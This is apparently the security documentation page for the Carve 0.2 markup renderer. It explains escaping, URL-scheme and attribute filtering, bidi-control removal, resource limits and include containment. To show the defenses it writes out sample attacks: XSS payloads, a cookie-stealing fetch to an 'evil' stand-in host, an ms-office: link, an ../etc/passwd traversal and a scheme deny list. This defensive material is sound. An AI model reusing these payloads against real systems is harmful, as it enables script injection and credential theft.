---
description: How Carve 0.2 treats untrusted source - escaped HTML, raw HTML off by default, URL and attribute filtering, invisible controls, resource limits and includes.
---

# Security

Carve 0.2 treats untrusted source as data. The HTML renderer escapes bare HTML tags, keeps explicit raw HTML off unless the host turns it on, filters URL schemes and dangerous attributes, removes invisible direction controls from displayed text, and bounds the work a document can cause. None of these defenses needs configuration, and the URL and attribute filters have no off switch. This page describes each guarantee and the parts that stay with the host application.

## HTML is text, not markup

Carve has no implicit raw-HTML passthrough. A bare `<` or `>` in the source has no special meaning, so a tag typed into a document is escaped and shown as text:

::: compare no-render
<!-- carve-sample {"lint":"the bare-html-tag rule reports the escaped tag"} -->
```crv
<script>alert(1)</script>
```
```html
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
```
:::

`carve lint` reports such a tag with the `bare-html-tag` warning, so an author who meant markup learns that it was escaped. This removes the class of injection that comes from Markdown passing HTML through to the output.

Carve does have one explicit, author-opted passthrough: a ```` ```=html ```` raw block and a `` `...`{=html} `` raw span. In 0.2 the `rawHtml` option is off by default. With it off, a raw HTML block is written as an escaped code block (`<pre><code class="language-html">`) and a raw HTML span as its escaped text (C2-H-050, C2-H-051):

::: compare no-render
````crv
```=html
<b>hi</b>
```

Inline `<i>x</i>`{=html} raw.
````
```html
<pre><code class="language-html">&lt;b&gt;hi&lt;/b&gt;
</code></pre>
<p>Inline &lt;i&gt;x&lt;/i&gt; raw.</p>
```
:::

The escaped form is not a render loss. The command line prints one line on stderr per run in which it escaped raw HTML, naming the `--raw-html` flag. With `rawHtml: true` (or `carve render --raw-html`), the same source is written verbatim:

::: compare no-render
<!-- carve-example {"options":{"rawHtml":true}} -->
````crv
```=html
<b>hi</b>
```

Inline `<i>x</i>`{=html} raw.
````
```html
<b>hi</b>
<p>Inline <i>x</i> raw.</p>
```
:::

Turn raw HTML on only when both the source and the place the output goes are trusted. Raw content in a format other than `html` renders nothing in HTML and is reported as the render loss `raw-format-dropped`.

## URL scheme filtering (always on)

The HTML renderer tests every URL sink against the URL policy: the `href` of a link and an autolink, the `src` of an image, each URL in a URL-list attribute such as `srcset`, and a URL produced for a mention or tag by the `social` option. There is no option that turns this off. Under the default deny list, a destination with a denied scheme is written as an empty value. The link text or the image's alt text stays visible, but the element no longer goes anywhere:

::: compare no-render
```crv
[x](javascript:alert(1)) and [d](data:text/html;base64,PHNjcmlwdD4=)

![i](javascript:alert(1))

[ok](https://example.com), [rel](/docs/page) and [mail](mailto:team@example.com)
```
```html
<p><a href="">x</a> and <a href="">d</a></p>
<img src="" alt="i">
<p><a href="https://example.com">ok</a>, <a href="/docs/page">rel</a> and <a href="mailto:team@example.com">mail</a></p>
```
:::

Each blanked destination is reported once with the render loss `destination-denied`, whose severity is error. The default deny list holds the script schemes and the operating-system handler schemes:

`javascript`, `vbscript`, `data`, `file`, `ms-msdt`, `ms-office`, `ms-word`, `ms-excel`, `ms-powerpoint`, `ms-access`, `ms-visio`, `ms-project`, `ms-publisher`, `ms-infopath`, `ms-spd`, `ms-search`, `search-ms`, `ms-cxh`, `ms-cxh-full`, `shell`, `vscode`, `vscode-insiders`, `jar`.

What passes under the default deny list:

- Relative URLs with no scheme, such as `/docs/page` or `page.html`
- Fragments, such as `#section`
- Network-path references, such as `//cdn.example.com/x`, which take the scheme of the page
- Any scheme not on the list, such as `http`, `https`, `mailto`, `tel` and `ftp`

The scheme test works on a copy of the destination. It first removes the characters a browser ignores or that can hide a scheme (C0 controls and space, DEL and C1 controls, the Unicode space characters, the bidirectional controls, U+FEFF and U+FFFD, anywhere in the value), then reads the scheme and compares it without ASCII case. So `java` followed by a tab and `script:` tests as `javascript:`. The full list is `probe_removes` in the URL policy data.

An attribute block cannot bring a failed destination back: an authored `href` on a link or `src` on an image is never written, because the structural destination stands.

The one exception is the `img` fence extension: the bounded `data:image/svg+xml` URL that its own SVG sanitizer produces, passed directly to its `<img>`, is admitted despite the denied `data` scheme. An authored `data:` URL never is.

### Configuration

The policy is the `urlPolicy` render option. It holds either a deny list or an allow list, never both: an object with both is refused with an option error, and an empty object means the default deny list.

```js
import { render } from '@markup-carve/carve'

// Default: the deny list above, raw HTML off.
render(userInput)

// Allow list: only these schemes pass; relative URLs and fragments still pass.
render(userInput, { urlPolicy: { allow: ['https', 'mailto'] } })

// Trusted input only: write raw HTML blocks and spans verbatim.
render(trustedInput, { rawHtml: true })
```

On the command line the same options are `--url-policy '<json>'` and `--raw-html`.

::: compare no-render
<!-- carve-example {"options":{"urlPolicy":{"allow":["https","mailto"]}}} -->
```crv
[https](https://example.com) and [ftp](ftp://example.com/file)
```
```html
<p><a href="https://example.com">https</a> and <a href="">ftp</a></p>
```
:::

::: warning A custom deny list replaces the default
`urlPolicy: { deny: [...] }` is the whole deny list for URL sinks, not an addition to the default. A list that leaves out `javascript` lets `javascript:` links through. To tighten the policy, prefer an allow list. The engine exports the scheme test and the default list (`isUrlAllowed`, `urlScheme` and `DEFAULT_DENIED_SCHEMES` in the JavaScript engine) so that other code writing URL sinks can apply the same test instead of copying it.
:::

| Option | Default | Effect |
|---|---|---|
| `rawHtml` | `false` | Write explicit `=html` raw content verbatim. Leave off for untrusted documents. |
| `urlPolicy` | default deny list | Deny list or allow list of URL schemes. Has no off value. |
| `profile` | `full` | Restrict which node types render normally. See [Content profiles](./profiles). |

Canonical Carve output (`carve fmt` and the Carve writer) is not sanitization. It keeps authored URLs, denied schemes included, because its job is to give the author's document back. The tool that renders that source applies its own URL policy.

## Attribute hardening (always on)

Authors can attach `{key=value}` attributes to most elements. Independent of any option, the renderer drops the attributes that have no use in a content document and empties script-bearing values, on every element, including those an extension writes:

::: compare no-render
```crv
[x]{onclick=alert(1)}, [y]{srcdoc=a formaction=b}, [z]{background=javascript:alert(1)}

[s]{style=x:expression(alert(1))} and [t]{style=color:red title=ok}

[u]{title="Shell: bash"}
```
```html
<p><span>x</span>, <span>y</span>, <span background="">z</span></p>
<p><span style="">s</span> and <span style="color:red" title="ok">t</span></p>
<p><span title="">u</span></p>
```
:::

The rules, on every rendered element:

- An attribute whose name starts with `on` (event handlers), and `srcdoc` and `formaction`, are not written. Names compare without ASCII case.
- An authored value is written empty when the text before its first colon, after the probe characters are removed and lowered, is a scheme of the default deny list. This holds whatever `urlPolicy` says, so `{title="Shell: bash"}` gives `title=""`. A value without a colon is not tested. `id` is not tested, and neither is text the renderer takes from content: a link title, an image's alt text and a task box label stay as written. Classes are tested one by one, so only a failing class is left out.
- `srcset`, `imagesrcset`, `ping`, `attributionsrc` and `background` hold a list of URLs. Each token is tested, and so is the whole value; any failure empties the whole value. Reading only the first scheme would let `srcset="safe.png 1x, javascript:alert(1) 2x"` through.
- A `style` value is written empty when, after its CSS escapes are decoded, its whitespace removed and its letters lowered, it holds `expression(`, `url(`, `image(`, `image-set(`, `src(`, `@import`, `behavior:` or `-moz-binding`. A value that passes is written as the author spelled it.

::: compare no-render
```crv
[a]{srcset="safe.png 1x, javascript:alert(1) 2x"} and [b]{ping="java script:x"}
```
```html
<p><span srcset="">a</span> and <span ping="">b</span></p>
```
:::

All other attributes pass through with their values HTML-escaped, quotes included, so a value cannot break out of its attribute.

## Invisible Unicode and Trojan Source (always on)

Bidirectional override and isolate controls (U+202A to U+202E, U+2066 to U+2069) can reorder the displayed text of code so that what a reader sees differs from what runs. This is the "Trojan Source" attack ([CVE-2021-42574](https://nvd.nist.gov/vuln/detail/CVE-2021-42574)). Carve handles them in three places:

- **HTML output removes them** from text and code, and from text the renderer makes itself, such as titles, cross-reference text and degraded forms (C2-H-172). They are removed, not encoded: an HTML parser would turn `&#x202e;` back into the live control. The directional marks LRM and RLM (U+200E, U+200F), which right-to-left text needs, stay. Raw content passed through with `rawHtml` on is not filtered.
- **The tree and canonical Carve keep them.** A formatter must give the author's text back, so `carve fmt` preserves them. `carve lint` reports each one with the `bidi-control-in-source` warning.
- **Heading ids drop them.** Generated ids are normalized to NFC, and the bidirectional controls, zero-width characters (U+200B, U+200C, U+200D, U+2060, U+FEFF) and the soft hyphen are removed. A precomposed and a decomposed `é` give the same id, and an invisible character never ends up inside an `id`.

::: compare no-render
<!-- carve-sample {"lint":"the bidi-control-in-source rule reports both controls"} -->
```crv
run `if (admin)‮ //‬ ok` then deploy
```
```html
<p>run <code>if (admin) // ok</code> then deploy</p>
```
:::

A U+0000 in the source is read as U+FFFD before parsing, so no tree and no output carries a NUL.

## Resource limits (denial of service)

Nested or repetitive input cannot drive unbounded work. The bounds live in the limits data of the specification:

| Bound | Value | Effect past the bound |
|---|---|---|
| Block nesting | 200 open containers | A further opener is text. |
| Inline nesting | 200 open brackets and delimiters per inline content | A further opener is text. |
| Derived text per render | 1,000,000 bytes or 8 times the source length, whichever is more | Further abbreviation expansions, resolved cross-reference texts and snippet copies degrade. |
| Include depth | 16 levels | The directive stays unexpanded (`include-depth`). |
| Include bytes | 8,388,608 bytes per expansion | Further includes stay unexpanded (`include-budget`). |
| Profile input length | `comment` 100,000 bytes, `minimal` 10,000 bytes | The render is refused before parsing. |
| Profile nesting | `comment` 4, `minimal` 2 container levels | Deeper containers degrade. |

The derived-text budget stops a small document, such as a long abbreviation reused thousands of times, from rendering to hundreds of megabytes. Extensions, metadata blocks and snippets have their own depth and size limits in the same data. A host may lower the include limits and may not raise them.

For an explicit input-size ceiling, pick a profile with a length bound or check the length before calling the renderer.

## File inclusion

The include directive `{{ path }}` (see [File inclusion](./includes)) is the one feature that pulls in source the author did not write inline, so it has its own rules.

- **A library call reads no files by itself.** Without a resolver in the `includes` option, every directive stays unexpanded, renders as its own text in a paragraph and is reported as `include-no-resolver`. A browser or sandboxed build is inert here unless the host supplies a resolver.
- **The command line expands by default** when it reads the entry document from a file and writes HTML or another non-Carve target. The root is the directory of the entry file, as a canonical path. `--no-includes` turns expansion off and `--include-root <path>` names another root. Reading from standard input, the command line expands nothing unless a root is named. `carve fmt` and the other commands whose output is Carve source never expand; `carve flatten` is the one exception, and its product is the expanded source.
- **Containment is canonical, not lexical.** The file resolver resolves the path against the including file, takes the canonical form with every symbolic link resolved, and refuses (`outside_root`) any result outside the canonical root. A `..` segment is fine when the result stays inside the root, and an absolute path is allowed only when it canonicalizes inside the root. A lexical `..` check would be too strict (it rejects `../shared/glossary.crv` from `chapters/`) and too weak (symbolic links and absolute paths escape without any `..`).
- **The answer never reveals files outside the root.** Containment is tested before existence, so a missing file outside the root is reported as `outside_root`, not `not_found`. Messages name the path as the directive wrote it and never repeat a host path.
- **No remote fetches.** A path that starts with a URI scheme is `outside_root`. The file resolver fetches nothing remote.
- **One root per expansion.** A nested include resolves its path against its own including file but is tested against the root of the top-level document; the root is never re-based per file.

```
book/            <- root (default: directory of the top-level document)
  main.crv
  chapters/ch1.crv
  shared/glossary.crv
```

From `chapters/ch1.crv`, `../shared/glossary.crv` is allowed (it canonicalizes inside `book/`), while `../../../etc/passwd` is refused.

Containment does not restrict reads within the root. An author who controls an include can read any text file inside it, within the size limits. Use a root without credentials or private files; an editor rooted at a workspace that holds `.env` may need a narrower root. Server-side user content should leave inclusion off.

A resolver that tests a path and then opens it again can be raced by someone who swaps a symbolic link in between. The specification requires the resolver to read the file it tested, for example by comparing the identity of the opened handle with the tested path, or by opening each segment from a handle of the root. On a platform that offers neither, do not let untrusted documents or other processes change the tree during expansion.

Included content is parsed and rendered under the same rules as the including document: one `urlPolicy`, one `rawHtml` setting, one `profile` and every sanitizing rule apply to the whole expanded tree. An include cannot bring back a capability the host turned off for the parent.

Amplification is bounded: an include that returns to a file already open on its chain is refused as `include-cycle`, and the depth and byte limits in the table above cap the rest. Every failure leaves the directive as visible text with a warning, never a silent drop.

## Non-HTML render targets

The guarantees on this page are those of the HTML renderer. The Markdown, plain text and ANSI exports (`--to markdown`, `--to plain`, `--to ansi`) are engine behavior outside the 0.2 specification (C2-T-003), so their escaping and filtering are not specified. If you convert untrusted Carve to Markdown that is later rendered to HTML, or to terminal output, check what your engine does and sanitize at that boundary.

The HTML importer reads the same `rawHtml` option. With it off, the default, it drops every comment, script, style, embedded object, form control and other raw element, and reports each one with `import-element-dropped`. See [HTML import](./html-import).

## Extension renderers

An extension renderer is trusted host code. The HTML it returns is written unchanged, and the same holds for a `codeBlockRenderer` function and for `symbols` values. Register only renderers you trust, use the host helpers for escaping, the URL policy and the profile when a renderer writes dynamic values, and treat remote media or embeds as separate application decisions. See [Extensions](./extensions).

## What you still own

- **Social-token URLs.** `@mention` and `#tag` render as inert spans unless the `social` option provides `mentionUrl` or `tagUrl` templates or resolver functions. A template percent-encodes the name. A resolver receives the parsed name and returns a URL, so it owns lookup authorization, tenant containment, timeouts and request bounds. Either way the URL passes through the URL policy, and neither path can return HTML.
- **Arbitrary attributes.** Carve drops event handlers and script-bearing values on every element, but it is not a full HTML sanitizer: it does not allowlist which attributes may appear on which elements, and its URL and CSS checks are a denylist of known-dangerous constructs. If you accept untrusted input with arbitrary attributes, run the rendered HTML through a DOM sanitizer such as DOMPurify as well.
- **Where the HTML ends up.** Carve returns an HTML string. Your application inserts it into a page and sets the Content-Security-Policy around it.

## How Carve compares on security

Most lightweight-markup ecosystems leave sanitization to the consumer: the format says nothing about safety, and you add a sanitizer or a "safe mode" yourself. Carve's baseline on this page is part of the rendering contract and needs no configuration.

| | Built-in safety rules | URL scheme filtering | Attribute hardening | Trojan Source / bidi | Raw HTML default | Required resource bounds |
|---|:---:|:---:|:---:|:---:|:---:|:---:|
| **Carve 0.2** | yes | always on | always on | removed from output, ids normalized | off | yes (nesting caps, output budget, include limits) |
| CommonMark / markdown-it / marked | no | left to the consumer | no attribute model | none | varies by library (`markdown-it` defaults off) | no |
| GitHub GFM | no, platform sanitizer | GitHub's separate allowlist | GitHub's sanitizer | none in the format | sanitized server-side | no |
| Djot (Carve's parent) | no | none required | none required | none | on | no |
| MDX | compiles to JavaScript | n/a | n/a | none | executes code | no |

### Worked examples: same input, Carve and Markdown

The Carve output is real renderer output. The Markdown output is the CommonMark or GFM result before any downstream sanitizer runs, which is what an application gets when the sanitizer is missing or misconfigured.

**1. Script URL in a link**

::: compare no-render
```crv
[click](javascript:stealCookies)
```
```html
<p><a href="">click</a></p>
```
:::

Markdown, before a sanitizer:

```text
<p><a href="javascript:stealCookies">click</a></p>
```

**2. Dangerous attributes**

::: compare no-render
```crv
[hover]{onclick=steal() style=x:expression(alert(1))}
```
```html
<p><span style="">hover</span></p>
```
:::

A Markdown attribute extension such as `markdown-it-attrs` typically writes both attributes as given.

**3. A bare HTML tag.** Carve escapes it, as shown in [HTML is text, not markup](#html-is-text-not-markup). Markdown emits `<script>alert(1)</script>` live.

**4. Trojan Source.** Carve removes the override from the rendered code, as shown in [Invisible Unicode and Trojan Source](#invisible-unicode-and-trojan-source-always-on). Markdown passes the control character through, and the browser displays the code in a different order than it runs.

**5. Amplification.** A long abbreviation reused thousands of times stops expanding once the render reaches its derived-text budget (1 MB or 8 times the input, whichever is more) and degrades to plain text.

::: tip Prefer the `img` fence over raw `=html` for SVG
To put SVG on a page without raw HTML, use the [`img` fence](./svg-images). It sanitizes the SVG and emits it as an `<img>` with a bounded `data:image/svg+xml` source.
:::

## Real-world Markdown CVEs, and where Carve stands

Two recent vulnerabilities show the two classes of Markdown attack that Carve's baseline addresses.

### Embedded HTML leading to script execution (CVE-2025-65716, Markdown Preview Enhanced)

The VS Code extension rendered a Markdown file's embedded `<script>` and `<iframe>` into a same-origin preview without sanitizing them, which gave the page script execution with localhost access. The same payload in Carve:

::: compare no-render
<!-- carve-sample {"lint":"the bare-html-tag rule reports both escaped tags"} -->
```crv
<iframe src="http://localhost:8080/scan"></iframe>
<script>fetch("//evil/?" + document.cookie)</script>
```
```html
<p>&lt;iframe src=“http://localhost:8080/scan”&gt;&lt;<em>iframe&gt;
&lt;script&gt;fetch(“//evil</em>?” + document.cookie)&lt;/script&gt;</p>
```
:::

The output is one escaped, inert paragraph. The slashes pair into an emphasis span, but no tag is live. The only way to emit raw HTML is the explicit `=html` construct, which is off by default.

::: tip A preview still owns its sandbox
Even with inert output, a preview application should render into an `iframe[sandbox]` without same-origin or localhost access, under a Content-Security-Policy, and keep `rawHtml` off for untrusted files.
:::

### Dangerous URI scheme in a link leading to an OS command (CVE-2026-20841, Windows Notepad)

Notepad's Markdown links passed clicks to Windows URI handlers, so a crafted `file:` or `ms-office:` / `ms-msdt:` link could start a program or open a macro-enabled document. Carve's default deny list blanks these:

::: compare no-render
```crv
[open](ms-office:ofe|u|http://evil/x.docm)
```
```html
<p><a href="">open</a></p>
```
:::

| Scheme | Result under the default policy |
|---|---|
| `javascript:` `vbscript:` `data:` `file:` | blanked |
| `ms-msdt:` (Follina), `ms-office:` `ms-word:` `ms-excel:` and the other Office handlers | blanked |
| `ms-search:` `search-ms:` `shell:` `ms-cxh:` `vscode:` `jar:` | blanked |
| `http:` `https:` `mailto:` `tel:` `ftp:` `sms:` | allowed |

::: warning A deny list is a moving target
Blocking the known command-execution schemes closes the documented cases, but new OS handlers appear. If your application turns link clicks into OS-handler calls (a desktop preview, an editor), use an allow list, such as `urlPolicy: { allow: ['http', 'https', 'mailto'] }`, so only vetted schemes reach an `href`.
:::

## Beyond the baseline: profiles

The baseline on this page applies under every setting. A render profile (`article`, `comment` or `minimal`) additionally restricts which node types render normally, bounds input length and nesting, and under `comment` adds `rel="nofollow ugc"` to links. See [Content profiles](./profiles).

## Changed in 0.2

- Raw HTML is off by default. The 0.1 `--no-raw-html` and safe-mode behavior is now what you get without flags; use `--raw-html` or `rawHtml: true` only when raw markup is required and allowed.
- The URL policy is one `urlPolicy` option with a deny list or an allow list. The 0.1 options `sanitizeUrls`, `allowedUrlSchemes` and `deniedUrlSchemes` are gone, and there is no way to turn URL filtering off.
- The 0.1 profile objects and safe-mode objects with domain lists are replaced by four named profiles. Host limits for links move to the `linkPolicy()` navigation extension in `@markup-carve/carve/extensions`.
- The Markdown, plain text and ANSI exports are no longer covered by the specification's security rules (C2-T-003).

See [Upgrading to 0.2](./upgrade-0-2) for the full list.

**Specification (external):** [HTML rendering, options and URL policy](https://github.com/markup-carve/carve/blob/main/spec/0.2/html.md#options), clauses C2-H-050 to C2-H-054 (raw content), C2-H-127 to C2-H-129 and C2-H-159 to C2-H-173 (options, URL and attribute filter, profiles, bidirectional controls), C2-H-201 (derived-text budget); [`url-policy.json`](https://github.com/markup-carve/carve/blob/main/spec/0.2/data/url-policy.json), [`options.json`](https://github.com/markup-carve/carve/blob/main/spec/0.2/data/options.json) and [`limits.json`](https://github.com/markup-carve/carve/blob/main/spec/0.2/data/limits.json); [Includes](https://github.com/markup-carve/carve/blob/main/spec/0.2/includes.md), clauses C2-N-003 to C2-N-014 and C2-N-061 to C2-N-070; [Extensions](https://github.com/markup-carve/carve/blob/main/spec/0.2/extensions.md#resolution-rendering-and-equality), clauses C2-X-034, C2-X-059 and C2-X-060; [Tooling](https://github.com/markup-carve/carve/blob/main/spec/0.2/tooling.md), clauses C2-T-003 and C2-T-018; [Upgrading](https://github.com/markup-carve/carve/blob/main/spec/0.2/UPGRADING.md#command-line-and-missing-features).
